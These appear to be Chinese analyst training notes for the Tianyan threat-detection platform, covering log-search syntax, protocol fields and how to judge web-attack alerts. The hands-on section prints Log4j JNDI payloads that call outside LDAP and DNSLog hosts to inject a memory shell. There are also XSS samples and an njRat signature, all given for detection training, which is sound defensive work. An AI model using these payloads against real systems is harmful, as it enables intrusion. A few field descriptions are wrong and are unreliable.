置：\n包括系统证书配置、网络配置、时间配置、升级配置、运营配置、存储管理、系统维护、诊断工具、系统信息配置，配置完成\n后点击“保存”即可生效。\n其中【升级配置】模块用于显示系统软件版本、引擎与规则库版本、威胁情报版本以及设置系统&#x2F;规则的升级方式、升级周期和相关\n升级配置。\n注：自动升级功能需要在系统能够访问天眼升级服务器的情况下使用，为了保证系统的及时更新，建\n议配置为自动升级。\n\n—联动管理：\n【数据传输设置】模块用于配置分析平台、文件威胁鉴定器、SYSLOG服务器、Hadoop平台、攻击诱捕系统5种平台的传输规则配置，同时提供了\n日志外发白名单功能，匹配白名单的日志将不再传输给其他平台。\n【邮件配置】\n【SNMP管理】模块提供用户SNMP服务配置和SNMP Trap配置功能，用来对设备运行状态进行实时监测。管理员可通过SNMP客户端主动访问设备\nMIB库查询，也可通过配置SNMP Trap在客户端接收设备发出的Trap消息。\n【取证存储平台配置】\n—安全性配置：包括登陆设置、数据传输加密、敏感操作密码、单点登录密钥配置。\n【登录设置】用来配置系统账号安全参数，提高账户安全性以及防破解能力\n【数据传输加密】提供与分析平台、Hadoop平台、文件威胁鉴定器联动时的数据加密功能及相关配置，可配置加密算法、加密密钥。\n注：对端的分析平台、Hadoop平台、文件威胁鉴定器需配置相同的加密算法、加密密钥，否则无法\n解密设备传送的数据。\n【敏感操作密码】模块可以查看密码的具体内容，并且提供于弱口令的明文展示，在弱口令展示的时候默认不明文展示，输入\n“验证敏感操作密码”可以查看明文弱口令。敏感操作密码的默认密码为随机生成，并且敏感操作密码可以进行修改，修改格\n式为：6---32位数字或字母或特殊字符。\n【单点登录密钥配置】模块提供分析平台单点登录到流量传感器时的登录密钥配置，涉及从分析平台单点登录流量传感器、\n联动处置查看&#x2F;下发&#x2F;删除流量传感器的阻断策略功能。流量传感器与分析平台【系统管理---&gt;设备管理---&gt;设备配置】页面该采\n集设备的“免密登录密钥”保持一致时，方可使用上述功能。\n—账号管理：\n系统维护人员保证系统安全的一项措施，以控制系统维护人员对系统的使用、防止系统维护人员对系统的越权使用或误操作。\n—审计管理\n【操作审计】模块主要用于对用户操作信息进行查询和导出。管理员可按照开始时应用安全间、结束时间、用户、登录IP、功能、操作类型\n等信息进行条件查询。\n【系统日志】\n\n天眼设备介绍-天眼分析平台监测中心：—仪表盘\n仪表板默认统计了 8 个维度的数据，包括告警统计、攻击者统计、受害主机统计、系统维护、文件威胁\n鉴定器、邮件威胁检测系统、网神云锁和自定义视图。\n\n—系统运行监控\n全景图形式展现分析平台联动的设备信息。\n\n—检测工作台\n监测工作台支持用户自定义配置重点监测\n数据到工作台，方便用户统一查看并使用重点关\n注的系统功能模块信息。包含：重点监测：失陷\n主机、外部攻击、横向攻击、越权访 问、弱口\n令、挖矿行为、暴力破解、补天漏洞。威胁感知：\n告警列表，威胁情报，web 安 全，数据库安全，\n中间件安全，未授权行为，设备安全，攻击者视\n角和资产视角。分析中 心：DNS 服务分析，非\n常规服务分析，邮件行为分析，登录分析，web \n服务器行为分析， 数据库行为分析，访问行为\n分析。资产感知：资产管理，资产发现，资产互\n访，脆弱性， 配置核查。系统配置：证书配置，\n设备监控。\n\n—态势感知\n注 1：大屏支持分辨率 2k（1920*1080）、4k（3840*2160），其他分辨率的屏幕可 能会引起显示异常\n注 2：访问大屏需使用谷歌 67.0.3396.99 及以上版本，低版本谷歌浏览器访问大屏可 能会引起显示异常\n\n—态势感知高级版\n天眼威胁感知大屏持续监控攻击，且直观的展现攻击的总体状况，支持中国地图高交互下钻，安装胶囊\n客户端即可体验。主要由网络风险指数、告警总数、攻击概要、告警类型 TOP5、告警变化趋势、攻击者 \nTOP5、受害资产 TOP5 和实时告警组成。\n\n威胁感知：—告警列表流量传感器文件威胁鉴定器邮件威胁检测系统攻击诱捕系统智慧管理分析系统（SMAC）服务器安全管理系统（云锁）SOAR自动化编排场景全部—威胁视角威胁情报应用安全—攻击者视角—资产视角\n自定义检索场景支持置顶、重命名、删除检索场景、保存+另存为检索场景\n\n分析中心：—日志检索\n日志检索支持快捷模式、高级模式、专家模式。\n\n—行为分析DNS服务分析非常规服务分析邮件行为分析登陆行为分析web服务器行为分析数据库行为分析访问行为分析黑IP行为分析旁路阻断行为分析\n行为分析包括 DNS 服务分析、非常规服务分析、邮件行为分析、登录行为分析、 WEB 服务器行为分析、\n数据库行为分析和访问行为分析七大模块，每个部分包含对应的分析场景，基本涵盖行为分析的业务场景。\n行为分析覆盖场景丰富，根据多种威胁类型全面检测用户环境的异常行为。其中 DNS 服务分析包含了\n子场景可疑 DNS 解析、 DNS 服务器发现、链路劫持分析、DNS 重绑定分析；非常规服务分析包含了子\n场景可疑代理、远程工具、反弹 shell；登录行为分析包含了子场景暴力破解、异常登录、特权账号登录\n、弱口令、明文密码泄露；WEB 服务行为分析包括非常用请求方法发现、 可疑爬虫或扫描、后门上传利\n用；访问行为分析包括外部访问、横向访问、内部主机外联、风险端口访问。\n\n—全包取证分析—天眼狩猎\n响应处置：—处置编译工作流程联动服务任务脚本帮助文档—策略管理策略定义策略联动—处置记录—联动记录\n资产感知：—资产资产管理资产发现资产互访IP地址管理—脆弱性—配置核查—补天漏洞\n报表报告：—快速报表—周期报表—报表模板\n重保：—重保模式\n重保演习主要为了护网事件所设定，用户可以自定义护网任务，根据用户所选择的资产组进 行重点关注。\n护网任务一共包含三个阶段：备战阶段、实战阶段、战后任务列表。\n【自定义黑 IP】可通过本地录入和离线导入两种方式导入黑 IP。其中本地录入支持手动添加黑 IP 和\n从本地批量上传黑 IP 两种方式。\n离线导入 方式数据导出和离线导入两种操作。若未安装或激活黑 IP 插件，点击【导出统计数据】按钮，\n则会跳转至扩展程序配置页面；若已安装并激活黑 IP 插件，点击【导出统计数据】按钮，则跳转至 \n【扩展程序】-&gt;【告警分析】页面\n\n—倒计时配置\n更多：—安全服务服务记录安全工具\n—扩展程序\n—第三方日志\n系统管理：—基础配置\n【系统升级】提供了在线升级和离线升级系统软件版本、规则库版本和补天漏洞情报版本。\n注 1：在线升级时，规则库版本自动后台升级，每小时的 15 分请求一次云端，如果规则有更新\n则自动进行升级。离线升级时，规则库版本同样使用“离线升级”入口进行手动升级。\n\n—联动管理—审计管理—规则管理—设备管理\n天眼设备介绍-文件鉴定器检测能力\n\n云查杀引擎\n数字签名检测\nQEX脚本查杀引擎\n启发式引擎\nQVM人工智能引擎\n系统文件智能修复引擎\n安卓文件检测引擎\nBitDefender检测引擎检测能力\n云查杀引擎\n数字签名检测\nQEX脚本查杀引擎\n启发式引擎\nQVM人工智能引擎\n系统文件智能修复引擎\n安卓文件检测引擎\nBitDefender检测引擎\n模拟文件真实运行\n分析文件行为\n\n天眼文件威胁鉴定器\n\n沙箱：支持4套环境（包括WIN XP,WIN7;搭载Office 03&#x2F;07等环境）\n行为：主机行为：文件、注册表、进程、互斥体、服务等网络行为：外链域名、外链主机等\n异常异常检测：异常开启、异常关闭、检测沙箱环境等相关行为\n策略针对大数据引擎及沙箱评估进行综合打分策略设定；并在此基础上设置处置策略支持威胁情报匹配\n文件多文件来源： ? 流量还原 ? 目录服务器（FTP&amp;SMB） ? 手动提交 ? API接口\n环境灵活的流程控制，可基于策略进行样本归档、静态-动态检测流程自定\n\n天眼日志检索语法(重点1)布尔运算符（AND、OR、NOT）\n日志检索系统支持 AND OR NOT 三种运算符（运算符要大写）。\nAND 运算符（ AND 、 &amp;&amp; 或 + ）\nAND 运算符关联两部分内容，代表两部门内容必须同时存在。\n示例： dip:10.16.16.46 AND client_os:&quot;Windows7 or 8&quot;\nOR 运算符（ OR 或 || ）\nOR 运算符关联两个项或短语，任意一个匹配即满足。\n示例： dport:&quot;443&quot; OR dport:&quot;8080&quot;\nNOT 运算符（ NOT 、! 或 - ）\nNOT 运算符排除含有NOT 运算符后面的项或短语的记录。相当于非运算符。\n示例： dport:&quot;80&quot; NOT host:&quot;www.example.com&quot;\n\n搜索语句一般由 “字段名称”、“项”、以及 “运算符”三大\n元素组成。\n\n短语搜索运算符&quot; &quot;\n短语运算符将短语括在引号 &quot; &quot; 中。 例如，Roach Motel（没有引号）会以任何顺序\n在任何位置搜索包含 Roach 和&#x2F;或 Motel 的文档，而 &quot;Roach Motel&quot;（带引号）只\n会匹配包含整个短语并按该顺序排列的文档（文本分析仍然适用）。\n优先运算符（）\n优先运算符将字符串括在括号 ( ) 中。 例如，motel+(wifi | luxur y) 将搜索包含\nmotel 词条以及 wifi 或 luxur y（或两者）的文档。\n分组\n(jakarta OR apache) AND jakarta\n字段分组\ntitle:(+return +&quot;pink panther&quot;)\nhost:(baidu OR qq OR google) AND host:(com OR cn)\n\n日志检索高级查询语法\n通配符查询\n支持在一个项内的单个和多个字符的通配符搜索。使用问号（? ）表\n示单个字符的通配符搜索，使用星号（ * ）表示多个字符的通配符搜索。\n多字符的通配符搜索寻找零个或多个字符。\n示例 ：搜索单词m s sql或m y sql可以使用 db_type:m?sql (不加引号)\n范围查询\n查询所指定的上限和下限之间的字段值的记录匹配。可用于数值 &#x2F;\n时间&#x2F; IP 类型的字段。包含上下限范围的查询通过方括号和运算符TO\n来表示。\n示例 ：搜索IP范围 [&quot;192.168.0.0&quot; TO &quot;192.168.255.255&quot;]\n注：搜索的关键字尽量不要包含特殊符号+ -&amp;&amp; ||! ( ) &#123; &#125; [ ] ^ &quot; ~ *? : \\以上特殊字符如果包含在搜\n索的关键字内，需要使用“\\”转义。\n\n协议字段介绍威胁告警检索字段\n\nattack_sip 攻击者 IP\nalarm_sip 受害者 IP\nattack_type 攻击类型\nis_web_attack 用于标记告警是否是 web 告警\n0: 否\n1: 是\nhazard_level 威胁级别 威胁级别标识、取值： 0 - 10\n\n网络协议公共字段网络协议字段\naccess_time 日志生成时间\n传感器采集到该数据包并解析完成生\n成日志的时间戳\n@timestamp 时间戳 日志在分析平台存储入库时添加\nsip 源 ip 网络数据流的发起 IP\nsport 源端口 网络数据流的客户端应用端口\ndip 目的 ip 网络数据流的服务端 IP\ndport 目的端口 网络数据流的服务端应用端口\ngeo ip 对应的地理位置\n\nTCP协议&amp;UDP\nproto 协议 IP包头中的协议字段值\nuplink_length 上行字节数\n从TCP流的建立到该流的结束，从客户端发往服务器端的\n应用层数据的字节总数\ndownlink_length 下行字节数\n从TCP流的建立到该流的结束，从服务器端发往客户端的\n应用层数据的字节总数\nsrc_mac 源mac TCP 数据流客户端发往服务端的数据包，源MAC地址\ndst_mac 目的mac TCP 数据流客户端发往服务端的数据包，目的MAC地址\nup_payload 上行前 100 字节\n从TCP流的建立起，从客户端发往服务器端应用层的前 100\n个字节\ndown_payload 下行前 100 字节\n从TCP流的建立起，从服务器端发往客户端应用层的前 100\n个字节\n\nHTTP协议HTTP请求方式\n1 GET 请求指定的页面信息，并返回实体主体。\n2 HEAD 类似于GET 请求，只不过返回的响应中没有具体的内容，用于获取报头\n3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包\n含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。\n4 PUT 从客户端向服务器传送的数据取代指定的文档的内容。\n5 DELETE 请求服务器删除指定的页面。\n6 CONNECT HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。\n7 OPTIONS 允许客户端查看服务器的性能。\n8 TRACE 回显服务器收到的请求，主要用于测试或诊断。\n9 PATCH 是对PUT 方法的补充，用来对已知资源进行局部更新。\n\n根据HTTP 标准，HTTP 请求可以使用多种请求方法。\nHTTP1.0 定义了三种请求方法：GET, POST 和HEAD方法。\nHTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和CONNECT 方法。\n\nHTTP包头的method字段\n最常见：GET和POST\nuri 请求的资源 HTTP包头的URI字段\nhost 请求的域名 HTTP包头的host字段\ncookie Cookie HTTP包头的cookie字段\nagent 请求者信息 HTTP包头的user-Agent字段\nreferer 链接来源 HTTP包头的referer字段\nxff 请求端真实IP和代理 HTTP包头的xff字段（仅供参考）\n\nPOST类型的报文，截取POST的部分原始\n数据，最多 1000 字节\n\nHTTP状态码\n状态码 状态码英文名称 中文描述\n100 Continue 继续。客户端应继续其请求\n200 OK 请求成功。一般用于GET与POST请求\n302 Found 临时移动。与 301 类似。但资源只是临时被移动。客户端应继续使用原有URI\n400 Bad Request 客户端请求的语法错误，服务器无法理解\n401 Unauthorized 请求要求用户的身份认证\n402 Payment Required 保留，将来使用\n403 Forbidden 服务器理解请求客户端的请求，但是拒绝执行此请求\n404 Not Found 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人\n员可设置&quot;您所请求的资源无法找到&quot;的个性页面\n405 Method Not Allowed 客户端请求中的方法被禁止\n500 Internal Server Error 服务器内部错误，无法完成请求\n502 Bad Gateway 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一\n个无效的响应\n\nHTTP X-Forwarded-For\nX-Forwarded-For(XFF)是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的\n客户端最原始的IP地址的HTTP请求头字段。\n每经过一个代理设备，设备可添加一个proxyN，这个字段是否可信取决于上一跳设\n备是否可信。\nX-Forwarded-For: client1, proxy1, proxy2, proxy3\n\nHTTP referer\nHTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般\n会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得\n一些信息用于处理。\nReferer字段是分析漏洞利用行为时的重要参考字段，进行辅助溯源，判断告警\n触发方式。\n\nDNS协议http:&#x2F;&#x2F;www.163.com&#x2F;index.html\n1)http:&#x2F;&#x2F;:这个是协议，也就是HTTP超文本传输协议，也就是网页在网上传输的协议。\n2 ）www：这个是服务器名，代表着是一个邮箱服务器，所以是mail.\n3)163.com:这个是域名，是用来定位网站的独一无二的名字。\n4) http:&#x2F;&#x2F;www.163.com：这个是网站名，由服务器名+域名组成。\n5 ）&#x2F;：这个是根目录，也就是说，通过网站名找到服务器，然后在服务器存放网页的根目录\n6:）index.html：这个是根目录下的默认网页（当然， 163 的默认网页是不是这个我不知道，\n只是大部分的默认网页，都是index.html）\n7 ）http:&#x2F;&#x2F;www.163.com&#x2F;index.html:这个叫做URL，统一资源定位符，全球性地址，用于\n定位网上的资源。\n域名\n国家顶级域名 ：中国:cn，美国:us，英国uk...\n通用顶级域名 ：com 公司企业 edu教育机构gov政府部门 int国际组织 mil军事部门 net网络 org非盈利组织\n\nDNS\ndns_type DNS访问类型\n表示是请求报文还是响应报文； 0 代表DNS请求； 1 代表\nDNS响应\nhost Host 请求的域名信息\naddr 地址资源\nDNS的A记录，表示该host对应的IP地址信息；可能有多个\n记录\nmx 邮件交换记录 DNS的MX记录\ncname 域名的规范名称 DNS的CNAME记录，表示该host域名的其他别名记录\nreply_code DNS响应结果状态 DNS响应报文中Flags字段中的Reply code信息\n\n\nSSL协议\nversion 版本号 SSL的版本号\nsession_id 会话id\n本次会话的session_id, server hello 报文中的\nsession_id\nserver_name 服务器名字\nSSL client_hello报文中的扩展字段通过该字段判\n断客户端和哪个站点进行交互。\nissuer_name 每封证书中的颁发者的名字 每封证书中的颁发者的名字\nnotbefore 该证书的有效期的起始时间 该证书的有效期的起始时间\nnotafter 该证书的有效期的起始时间 该证书的有效期的起始时间\npublic_key 该证书的公钥 该证书的公钥\nuser_name Sever端的证书的持有者\n最上层证书的使用者，即本次SSL连接Sever端的\n证书的持有者\n\n文件传输\nproto 协议 协议名称；FTP&#x2F;SMB&#x2F;HTTP\ntrans_mode 传输模式 文件的传输模式；对于源ip来说，upload表示上传，\ndownload表示下载\nfile_name 文件名字 无\nfile_md5 文件md5 对于文件内容计算MD5\nmime_type 文件类型 文件类型\nuri 传输的资源及路径 HTTP包头的uri字段\nhost 域名 HTTP包头的host字段\nreferer 链接来源 HTTP包头的referer字段\nstatus 状态码 承载该文件的HTTP响应报文的返回码\nfile_dir 标示文件方向 文件的传输方向； 0 代表服务端传往客户端， 1 代表客户端\n传往服务端\nmethod 方法 HTTP包头的Method字段\nmime_type 文件类型 文件类型\n\n登陆协议proto 应用的协议\n登录行为数据流属于的应用协议；ftp, smb, oracle, mysql,\nmssql, postgresql, ssh, pop3, smtp\npasswd 登陆密码 登录使用的密码\ninfo 登陆结果\n登录操作的结果：成功或者失败，FTP协议会记录具体\n信息\nuser 用户名 登录使用的用户名\ndb_type 数据库类型 当登录的是数据库时，该字段会有数值，表示数据库具\n体类型；mssql，oracle，MySQL，postgresql四种\nnormal_ret 登录或数据库操作结果的\n归一化展示 success，failed\n\n邮件协议proto 应用协议\n邮件使用的应用协议; pop3, smtp, imap,\nwebmail\ntime 邮件发送&#x2F;接收时间 邮件包头中的邮件发送&#x2F;接收时间\nfrom 邮件发送人 来自于邮件头相应字段\nto 邮件接收人 来自于邮件头相应字段\ncc 邮件抄送人 来自于邮件头相应字段\nsubject 主题 来自于邮件头相应字段\nreferences 被当前邮件回复的邮件ID 来自于邮件头相应字段\nattach_name 附件名字 来自于邮件头相应字段\nattach_md5 附件md5 来自于邮件头相应字段\nmime_type 附件mime_type（字典库） 来自于邮件头相应字段\nplain 邮件正文 来自于邮件头相应字段\n\n数据库操作\nproto 数据库应用协议 根据报文中得到的协议字段转\n为可读的字符串；tds:mssql；\ntns:oracle；mysql:mysql；\npostgresql：postgresql\nversion 协议版本 协议的版本号\nuser 用户 报文提取\ndb_name 数据库 报文提取\ndb_type 数据库类型 mssql，oracle，mysql，\npostgresql四个值\nret_code 数据库操作返回的状态信息 sql语句执行的结果，Success或\n具体的失败信息\nsql_info 操作信息 报文提取的sql语句\n\n天眼告警监测分析(重点2)分类目录web攻击集合\n\n信息泄露\n弱口令\nXSS攻击\nSQL注入\n文件上传\n文件包含\nWebshell\n命令执行\nXML实体注入\n\n威胁情报集合\n\n木马远控\n挖矿木马\n勒索病毒\n僵尸网络\n黑市工具等\n\nWeb攻击信息泄露\n敏感数据包括但不限于：口令、密钥、证书\n、会话标识、License、隐私数据(如短消息的内\n容)、授权凭据、个人数据(如姓名、住址、电话\n等)等，在程序文件、配置文件、日志文件、备份\n文件及数据库中都有可能包含敏感数据。\n\n信息泄露——备份文件\n漏洞影响： 可能导致网站敏感信息泄露，被利用来进一步攻击等危害。\nURI中“1.zip”触发规则告警，访问URI地址，下载备份文件，分析备份文件，判断漏洞影响。\n修复建议： 删除该网站目录下的备份文件\n\n信息泄露——自动目录列表\n漏洞影响： 任何人可以访问该路下的文件，可能造成敏感信息泄露\n响应体中“Directory”触发规则告警，访问URI地址下目录文件，分析目录信息，判断漏洞影响。\n修复建议： 修改配置文件，禁止目录列表列出\n\n信息泄露——目录穿越\n漏洞影响： 利用此漏洞，黑客可以发现一些敏感信息，包括读取服务器敏感文件等。\n请求头..&#x2F;..&#x2F;触发规则告警，\n修复建议： 禁止目录遍历，对输入参数过滤..&#x2F;等字符。\n\n信息泄露——.svn源码泄露\n漏洞影响： 攻击利用该漏洞，可以获取到服务器源码、svn服务器账号密码等信息。\nURI“&#x2F;.svn&#x2F;entries”与响应体svn信息触发规则告警。\n修复建议： 禁止或删除.svn文件浏览\n\n弱口令\n密码过于简单，不满足复杂度要求；攻击\n者通过穷举方法尝试web登录的帐号名与密码。\n密码复杂度要求：口令长度不得小于 8 位，\n且为数字、字母、字符混合组合，用户名和口令\n不得相同，且无明显规律\n\n弱口令——字典\n常见的弱口令字典有默认型弱口令字典和社工型弱口令字典\n默认型的弱口令\n? 系统服务弱口令\n? 应用组件弱口令\n? 设备弱口令\n\n弱口令——web弱口令\n漏洞影响： 弱口令容易被人猜解，造成个人信息等数据丢失严重者可导致网站被攻陷。\n请求体中“password&#x3D;123456”弱口令，服务器返回“success”\n\n弱口令——中间件tomcat弱口令\n漏洞危害： 通过弱口令进入中间件后台可直接部署war包getshell\n中间件例如tomcat与basic认证弱口令信息在请求头Authorization字段中，可用base64进行解码\n\n暴力破解法，或称为穷举法，是一种针对于密码的破译方法。在一些领域，为了提高密码的破译效率而专\n门为其制造的超级计算机。例如，IBM为美国军方制造的“飓风”就是很有代表性的一个。破解任何一个密码\n也都只是一个时间问题。\n弱口令案例：\n\n弱口令——暴力猜解\n攻击者在短时间内通过穷举帐号名与密码的方法尝试web登录，看到暴力猜解的告警要结合流量日志分析溯源判断是否爆破成功。\n\n弱口令——暴力猜解分析技巧\n**①HTTP登陆爆破，协议类型web日志**\nsip:(“攻击IP”) AND dip:(“受攻击系统IP”) AND data:(“登陆请求账号字段”)\n**②FTP、SMTP、Telnet、SSH、mysql数据库等登陆爆破，协议登陆动作**\nsip:(“攻击IP”) AND dip:(“受攻击系统IP”) AND proto:(“爆破协议”)\n**③过滤爆破登陆成功**\nsip:(“攻击IP”) AND dip:(“受攻击系统IP”) AND proto:(“爆破协议”) AND NOT (info:fail* OR info:530)\n\nXSS\n恶意攻击者往Web页面里插入恶意代码，当\n用户浏览该页之时，嵌入其中Web里面的js代码\n会被执行，从而达到恶意攻击用户的特殊目的 。\n利用xss 可 以 盗 取 用 户 cookie 、 xss 结合\nwindows 10 系统BadCon漏洞可导致系统蓝屏\n\n请求头“&lt;script&gt;alert(xss)&lt;&#x2F;script&gt;”与响应体“&lt;script&gt;alert(xsss)&lt;&#x2F;script&gt;”触发规则告警\n\n跨站攻击-分析技巧\n1 、如果遇到跨站响应数据比较多，可以将响应体的数据贴出来放到HTML文件里面打开，观察是否弹窗。\n2 、如果未弹窗，则在浏览器总CTRL+F查找对应未实体化的JS脚本代码，常见的跨站攻击代码如下：\n&#123;[[&lt;script]],[[&lt;a]],[[&lt;div]],[[&lt;img]],[[&lt;iframe]],[[&lt;svg]],[[&lt;body]],[[&lt;audio]],[[&lt;form]],[[&lt;isindex]],[[&lt;input]],[[&lt;marquee]],[\n[&lt;textarea]]&#125;\n\n发生于应用程序与数据库层的安全漏洞。\n简而言之，是在输入的字符串之中注入SQL指令，\n在设计不良的程序当中忽略了字符检查，那么这\n些注入进去的恶意指令就会被数据库服务器误认\n为是正常的SQL指令而运行，因此遭到破坏或是\n入侵。\nSQL注入\nSQL注入——union联合查询注入\n对SQL注入攻击成功Payload进行分析，如果服务器返回相应数据库查询信息，则判断攻击成功。\n发现成功爆出当前数据库用户：root@localhost，SQL注入攻击成功。\n\nSQL注入攻击——布尔盲注\n根据响应体长度进行分析判断是否注入成功，大多布尔盲注攻击是返回错误页面的，少数是返回正常页面，利用错\n误页面长度与正常页面长度不一致特性进行分析。上面数据包查看数据库用户名对应ascii码值，如果此ascii码值等于\n真正对应用户名母ascii值则返回正常页面，如果不等于则返回错误页面。\n\nSQL注入攻击——时间盲注\n服务器记录的响应时间和攻击注入的时间函数不一致，则攻击未成功。网站延迟过高也可能会导致告警成功。\n其中，图片中最后部分是分析数据。相关描述如下：\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;sqlblind delay&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\nCalculated delay: 3.60966413018 &#x2F;&#x2F;2）根据过去 30 次响应延迟，统计计算出来的延迟\nUsed delay: 3.60966413018 &#x2F;&#x2F;3）根据 2 ）和最低延迟（ 3 秒），取延迟的最大值\nAnalysis delay: 0 &#x2F;&#x2F;4）通过分析请求提取出来的延迟\nUsed retval_result: 3.60966413018 &#x2F;&#x2F;5）最终使用用于比较的延迟时间，Used delay和Analysis delay中的最大值\nCurrent rsptime: 10.137 &#x2F;&#x2F;6）当前响应延迟\nRsp_time_list: [0.156, 0.158, 0.157, 0.16, 0.123, 0.124, 0.121, 0.122, 0.151, 0.159, 0.131, 0.133, 0.144, 0.162, 0.153, 0.119, 0.131, 1.128, 1.106, 1.102, 0.105, 1.111, 1.111, 1.107, 1.106, 1.107, 0.103, 0.106,\n1.106, 0.108] &#x2F;&#x2F;1）过去的 30 次响应延迟\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;sqlblind delay&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\nSQL注入——Joomla! SQL注入漏洞\n通用SQL注入漏洞，大体上也是有回显与无回显，可根据服务器响应信息、响应时间、响应长度进行判断\n\n文件上传\n任意文件上传漏洞，主要是产生于网站所\n提供的文件上传功能，而由于网站没有严格限制\n文件上传格式，从而导致可上传任意的文件格式，\n特别是脚本木马（webshell）到服务器上，最\n终获得服务器的控制权限。\n\n客户端请求数据为PHP菜刀木马，服务器返回信息“success upload”判断webshell上传成功。\n\n文件上传——企图告警分析\n文件上传企图告警，根据数据包无法判断是否上传成功，可到分析平台查看是否有脚本文件的访问记录，如果有成功访问脚本\n文件记录，则脚本文件上传成功。\n\n文件上传——企图告警分析\n检索语法，uri:(“webshell文件名”)，如果上传脚本文件被重命名，就筛选出攻击IP对服务器的web协议的访问流\n量进行分析判断。\n\n文件包含\n文件包含漏洞的产生原因是在通过PHP的\n函数引入文件时，由于传入的文件名没有经过合\n理的校验，从而操作了预想之外的文件，就可能\n导致意外的文件泄露甚至恶意的代码注入。\n\nwebshell\n攻击者在入侵企业网站时，通常要通过各\n种方式获取webshell从而获得企业网站控制权，\n然后方便进行之后的入侵行为，webshell通用\n功能包括但不限于shell命令执行、代码执行、\n数据库枚举和文件管理。\nwebshell\nwebshell——哥斯拉通信\n哥斯拉是一个基于流量、HTTP全加密的webshell管理工具，所以从报文很难看出有明显的攻击特征，需要结合流量上下文找到哥斯拉webshell上传成功的流量来进行分析和判断。\nwebshell——冰蝎\n冰蝎是一款基于Java开发的动态加密通信流量的新型Webshell客户端。冰蝎的通信过程可以分为两个阶段：密钥协商、加密传输。\n命令执行\n命令执行漏洞，用户通过浏览器提交执行命\n令，由于服务器端没有针对执行函数做过滤，导致\n在没有指定绝对路径的情况下就执行命令，可能会\n允许攻击者通过改变 $PATH 或程序执行环境的其\n他方面来执行一个恶意构造的代码。\n\n命令执行——业务系统功能模块\n命令执行——Struts2命令执行\nStruts2代码执行，大多都是在HTTP的请求头或者请求体插入精心构造的恶意代码，如执行echo、print、whoami函数。\ns2- 01 --s2- 057 ，原理可以参考该文章：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;86757\n\n命令执行——Java框架通用代码执行\nJava通用命令执行成功的告警，有的执行命令的攻击payload不仅在请求头中存在，也会在请求体中存在。\n\n命令执行——SQL漏洞注入执行命令\nXML实体注入\nXXE全称XML External Entity Injection即\nxml外部实体注入漏洞，触发点多位于xml文件上\n传点。xml实体注入一般可以探测内网、读取系统\n任意文件，任意文件上传等。\n\n\nXML实体注入——基础知识\nXML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自\n己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。\n\nXML实体注入——漏洞分类\nXML实体注入——内网存活主机探测\nXML实体注入——任意文件读取\nXML实体注入——文件上传\nXML实体注入——文件上传\n网络攻击\n发现后门程序njRat 通信行为如何排查:\n感染了njrat的主机会不断与攻击电脑进\n行连接，访问一个固定端口。\nVHJvamFuX0M0NkY2RTk&#x3D;是他的特征，是\nbase64编码，解码后为Trojan_C46F6E9，\nVHJvamFuX0M0NkY2RTk&#x3D;后面是攻击的命\n令，您可以看一下是否有外连行为，这里没\n有执行其他操作，Win XP：操作系统信息、\n0.6.4：Njrat版本。0.6.4和endof之前的||：\n没有显示，若有内容应为base64编码，是攻\n击者相关行为的说明、endof：结束符。\n\n实操1\n导入告警流量包：登录天眼流量传感器，策略配置-抓包检测-PCAP文件检测 ， 添加文件后，导入pcap包\n\n实操2\n天眼告警分析：分析平台发现告警：\n1 、Apache Log4j2 远程代码执行漏洞(CVE- 2021 - 44228&#x2F;CVE- 2021 - 45046)\n2 、DNSLog渗透测试活动事件\n3 、发现利用特定域名带外DNS请求\n\n实操3\n查看详情发现Apache Log4j2 远程代码执行漏洞恶意payload：\n%24%7Bjndi%3Aldap%3A%2F%2F9w0cao.dnslog.cn%7D\n\n实操4\n通过解码小助手解密其payload为：$&#123;jndi:ldap:&#x2F;&#x2F;9w0cao.dnslog.cn&#125;，确定这是一个攻击行为。\n\n实操5\n查看详情-原始告警，分别点击详情，查看其分别执行了命令：whoami，\n解密小助手解密后Payload：$&#123;jndi:ldap:&#x2F;&#x2F;10.43.43.221:1389&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;\n注入内存马：\nPayload：$&#123;jndi:ldap:&#x2F;&#x2F;10.43.43.221:1389&#x2F;TomcatBypass&#x2F;TomcatMemshell2&#125;\n\n实操6\n来到分析中心-日志检索（选择高级分析-本级-网络日志-web访问）检索语句：uri:(*jndi*)\n\n实操7\n攻击成功情况：\n1 ，判断dnslog攻击成功：选择域名解析，存在源ip与dnslog.com的外联日志：\n\n实操8\n攻击成功情况：\n1 ，判断命令执行攻击成功：有回显命令执行：响应体中存在命令执行结果：\n\n实操9\n攻击成功情况：\n2 ，无回显命令执行：存在源ip与ldap服务ip的外联日志：\n3 ，判断内存马注入攻击成功：查看此攻击IP是否访问内存马目录，并执行其他操作：例如执行whoami等。\n\n企图类告警要不要看？\n① 企图类告警中也存在部分攻击成功的安全事件，\n② 弱口令告警，由于客户现场开发环境复杂，开发不够规范或者天眼规则没有匹配到成功的相应字段，一些web登陆的弱口令告警中虽然显示企图但已成功登陆，需要认真分析数据包信息或在授权的情况下进行登陆验证\n③ 例如，一个内网地址A自动攻击内网地址B，主机B不存在漏洞没有攻击成功，但是内网主机A已中招\n④ 